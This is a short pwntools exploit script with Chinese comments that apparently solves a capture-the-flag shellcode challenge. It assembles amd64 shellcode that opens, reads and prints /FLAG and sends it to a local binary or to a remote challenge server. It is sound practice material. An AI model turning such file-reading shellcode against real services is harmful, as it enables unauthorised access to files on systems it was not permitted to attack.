#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os   = 'linux'
context.log_level = 'info'          # 需要更安靜可改 'warning'

PORT     = 12341                    # 遠端題目 port
CHAL_BIN = './shellcode'            # 本地測試用 binary

# ──────────────────────────
# 1. 用 shellcraft 組出合法殼碼
#    openat → read → write → exit
# ──────────────────────────
sc  = shellcraft.openat(-100, "/FLAG", 0, 0)   # rax = fd
sc += shellcraft.read('rax', 'rsp', 0x100)     # read(fd, rsp, 256)
sc += shellcraft.write(1, 'rsp', 'rax')        # write(1, rsp, n)
sc += shellcraft.exit(0)

shellcode = asm(sc)                # ❶ 先組譯成 bytes

# ──────────────────────────
# 2. 建立連線
# ──────────────────────────
if 'local' in sys.argv:
    io = process(CHAL_BIN)
elif 'qemu' in sys.argv:
    io = process(['qemu-x86_64-static', CHAL_BIN], env={'NO_SANDBOX':'1'})
else:
    io = remote('up.zoolab.org', PORT)

# ──────────────────────────
# 3. 傳送 shellcode
# ──────────────────────────
io.recvuntil(b'code> ')            # 與 chal1.c 提示字串對齊
io.send(shellcode)
io.shutdown('send')                # ❸ 告訴對方「我送完了」

# ──────────────────────────
# 4. 收取並顯示 FLAG
# ──────────────────────────
print(io.recvall().decode())       # ❹ 一次讀光就結束
